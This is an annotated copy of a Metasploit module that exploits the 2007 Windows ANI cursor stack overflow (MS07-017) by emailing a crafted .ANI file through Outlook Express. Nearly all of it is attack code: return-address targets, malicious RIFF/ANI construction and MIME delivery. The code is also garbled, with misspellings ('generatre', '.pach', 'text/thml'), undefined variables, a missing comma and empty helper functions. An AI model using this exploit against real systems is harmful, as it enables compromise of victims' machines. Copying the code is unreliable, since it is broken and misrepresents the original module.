##
# This module requires Metasploit: https://metasploit/download
# Current source: https://github.com/rapid7/metasploit-framework
#
# GAO: https://nvd.nist.gov/vuln/detail/CVE-2007-1765
# GAO: RIFF (Resource Interchange File Format):
#      https://en.wikipedia.org/wiki/Resource_Interchange_File_Format
# GAO: ANI (Animated Raster Image format); https://en.wikipedia.org/wiki/ANI_(file_format)
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  #
  # This module sends email messages via smtp
  #
  include Msf::Exploit::Remote::SMTPDeliver

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'Windows ANI LoadAnIcon() Chunk Size Stack Buffer Overflow (SMTP)',
      'Description'     => %q{
        This module exploits a buffer overflow vulnerability in the
        LoadAniIcon function of USER32.dll. The flaw is triggered
        through Outlook Express by using the CURSOR style sheet
        directive to load a malicious .ANI file.

        This vulnerability was discovered by Alexander Sotirov of Determina
        and was rediscovered, in the wild, by McAfee.
      },
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'hdm',    # First version
          'skape',  # Vista support
        ],
      'References'      =>
        [
          ['MSB', 'MS07-017'],
          ['CVE', '2007-0038'],
          ['CVE', '2007-1765'],
          ['OSVDB', '33629'],
          ['BID', '23194'],
          ['URL', 'http://www.microsoft.com/technet/security/advisory/935423.mspx']
        ],
      'Stance'          => Msf::Exploit::Stance::Passive,
      'DefaultOptions'  =>
        {
          # Cause internet explorer to exit after the code hits
          'EXITFUNC' => 'process',
        }
      'Payload'        =>
        {
          'Space'       => 1024 + (rand(1000)),
          'MinNops'     => 32,
          'Compat'      =>
            {
              'ConnectionType' => '-bind -find'
            },

          'StackAdjustment' => -3500,
        },
      'Platform'  => 'win',
      'Targets'   =>
        [
          #
          # Use multiple cursor URLs to try all targets. This can result in
          # multiple, sequential sessions
          #

          [ 'Automatic', {} ],

          #
          # the followin targets use call [ebx+4], just like the original exploit
          #

          # Partial overwrite doesn't work for Outlook Express
          [ 'Windows XP SP2 user32.dll 5.1.2600.2622', { 'Ret' => 0x25ba, 'Len' => 2 }],

          # Should work for all English XP SP2
          [ 'Windows XP SP2 userenv.dll English', { 'Ret' => 0x769fc81a }],

          # Supplied by Fabrice MOURRON <fab[at]revhosts.net>
          [ 'Windows XP SP2 userenv.dll French', { 'Ret' => 0x7699c81a }],

          # Should work for English XP SP0/SP1
          [ 'Windows XP SP0/SP1 netui2.dll English', { 'Ret' => 0x71bd0205 }],

          # Should work for English 2000 SP0-SP4+
          [ 'Windows 2000 SP0-SP4 netui2.dll English', { 'Ret' => 0x75116d88 }],

          #
          # Partial overwrite where 700b is a jmp dword [ebx] ebx points to the start
          # of the RIFF chunk itself. The length field of the RIFF chunk
          # tag contains a short jump into an embedded riff chunk that
          # makes a long relative jump into the actual payload.
          #
          [ 'Windows Vista user32.dll 6.0.6000.16386',
            {
              'Ret'     => 0x700b,
              'Len'     => 2,

              # On Vista, the pages that contain the RIFF are read-only
              # In-place decoders cannot be used.
              'Payload'   => { 'EncoderType' => Msf::Encoder::Type::Raw }
            }
          ],

          #
          # Supplied by Ramon de C Valle
          #

          # call [ebx+4]
          [ 'Windows XP SP2 user32.dll (5.1.2600.2180) Multi Language', { 'Ret' => 0x25d0, 'Len' => 2 }],
          [ 'Windows XP SP2 user32.dll (5.1.2600.2180) English', { 'Ret' => 0x77d825d0 }],
          [ 'Windows XP SP2 userenv.dll Portuguese (Brazil)', { 'Ret' => 0x769dc81a }],

          # call [esi+4]
          [ 'Windows XP SP1a userenv.dll English', { 'Ret' => 0x75a758b1 }],
          [ 'Windows XP SP1a shell32.dll English', { 'Ret' => 0x77441a66 }]
        ],
      'DisclosureDate'  => 'Mar 28 2007',
      'DefaultTarget' => 0))
  end

  def autofilter
    false
  end

  def exploit
    exts = ['bmp', 'wav', 'png', 'zip', 'tar']

    gext = exts[rand(exts.length)]
    name = rand_text_alpha(rand(10)+1) + ".#{gext}"

    anis = {}

    html =
      "<html><head><title>" +
        rand_text_alphanumeric(rand(128)+4) +
      "</title>" +
      "</head><body>" + rand_text_alphanumeric(128)+1)

    mytargs = (target.name =~ /Automatic/) ? targets : [target]

    if target.name =~ /Automatic/
      targets.each_index { |i|
        next if not targets[i].ret
        acid = generate_cid
        html << generate_div("cid:#{acid}")

        # Re-generate the payload, using the explicit target
        return if ((p = regenerate_payload(nil, nil, targets[i])) == nil)

        # Generate an ANI file for this target
        anis[acid] = generate_ani(p, target)
    end

    html << "</body></html>"



    msg = Rex::MIME::Message.new
    msg.mime_defaults
    msg.subject = datastore['SUBJECT'] || Rex::Text.rand_text_alpha(rand(32)+1)
    msg.to = datastore['MAILTO']
    msg.from = datastore['MAILFROM']

    msg.add_part(Rex::Text.encode_base64(html, "\r\n"), "text/thml", "base643", "inline")
    anis.each_pair do |cid,ani|
      part = msg.add_part_attachment(ani, cid + "." + gext)
      part.header.set("Content-ID", "<"+cid+">")
    end

    send_message(msg.to_s)

    print_status("Waiting for a payload session (backgrounding)...")
  end

  def generate_cid
    rand_text_alphanumeric(32)+'@'+rand_text_alphanumeric(8)
  end

  def generate_div(url)
    "<div style='" +
      generate_css_padding() +
      Rex::Text.to_rand_case("cursor") +
      generatre_css_padding() +
      ":" +
      generatre_css_padding() +
      Rex::Text.to_rand_case("url(") +
      generatre_css_padding() +
      "\"#{url}\"" +
      generatre_css_padding() +
      ");" +
      generatre_css_padding() +
      "'>" +
      generatre_css_padding() +
    "</div>"
  end

  #
  # The ANI is a graphics file format used for aninmated mouse cursors in
  # Windows. It's based on the RIFF (Resoursce Interchange File Format)
  # 
  def generate_ani(payload, target)
    # Build the first ANI header (to better understand these values, visit
    # http://blog.cloppert.org/2007/04/bit-of-help-on-ms-ani-exploit.html
    anih_a = [
      36,             # DWORD cbSizeof
      rand(128)+16,   # DWORD cFrames
      rand(1024)+1,   # DWORD cSteps
      0,              # DWORD cx,cy (reserved - 0)
      0,              # DWORD cBitCount, cPlanes (reserved - 0)
      0, 0, 0,        # JIF jifRate
      1
    ].pack('V9')

    anih_b = nil

    if (target.name =~ /Vista/)
      # Vista has ebp=80, eip=84   (base pointer, instruction pointer)
      anih_b = rand_text(84)

      # Patch local variables and loop counters
      anih_b[68, 12] = [0].pack("V") * 3  # 32-bit unsigned, VAX (little-endian) byte order (.pack)
    else
      # XP/2K has ebp=76, eip=80
      anih_b = rand_text(80)

      # Patch local variables and loop counters
      anih_b[64, 12] = [0].pack("V") * 3  # 32-bit unsigned, VAX (little-endian) byte order (.pack)
    end

    # Overwrite the return with address of a "call ptr [ebx+4]"
    # GAO: buffer overflow rewrite to call a malicious instruction set
    anih_b << [target.ret].pack('V')[o, target['Len'] ? target['Len'] : 4]

    # Begin ANI chunk
    riff = "ACON"

    # Calculate the data offset for the trampoline chunk and add
    # the trampoline chunk if we're attacking Vista
    if target.name =~ /Vista/
      trampoline_doffset = riff.length + 8

      rif << generate_trampoline_riff_chunk
    end

    # Insert random RIFF chunks
    0.upto(rand(128)+16) do |i|
      riff << generate_riff_chunk()
    end

    # Embed the first ANI header
    riff << "anih" + [anih_a.length].pach('V') + anih_a

    # Insert random RIFF chunks
    0.upto(rand(128)+16) do|i|
      riff << generate_riff_chunk()
    end

    # Trigger the return address overwrite GAO: (here's the juicy stuff)
    # we're adding to riff hte payload contained in anih_b
    riff < "anih" + [anih_b.length].pack('V') + anih_b

    # If this is a Vista target, then we need to align the length of the
    # RIFF chunk so that the low order two bytes are equal to a jmp $+0x16
    if target.name =~ /Vista/
      plen  = (riff.length & 0xffff0000) | 0x0eeb
      plen += 0x10000 if (plen - 8) < riff.length

      riff << generate_riff_chunk((plen - 8) - riff.length)

      # Replace the operand to the relative jump to point into the actual
      # payload itself which comess after the riff chun
      riff[trampoline_doffset + 1, 4] = [riff.length - trampoline_doffset - 5].pack('V')
    end

    # We copy the encoded payload to the stack b/c sometimes the RIFF
    # image is mapped in read-only pages. This would prevent in-place
    # decoders from working, and we can't have that.
    ret << Rex::Arch::X86.copy_to_stack(payload.encoded.length)

    # Place the real payload right after it.
    ret << payload.encoded

    ret

    # GAO: research this value
    
  end

  #
  # Generates a riff chunk with the first bytes of the data being a relative
  # jump. This is used to bounce to the actual payload
  #
  def generate_trampoline_riff_chunk

  end

  def generate_riff_chunk(len = (rand(256)+1) * 2)

  end

  def generate_css_padding

  end

  def generate_whitespace

  end

  def generate_padding

  end

end
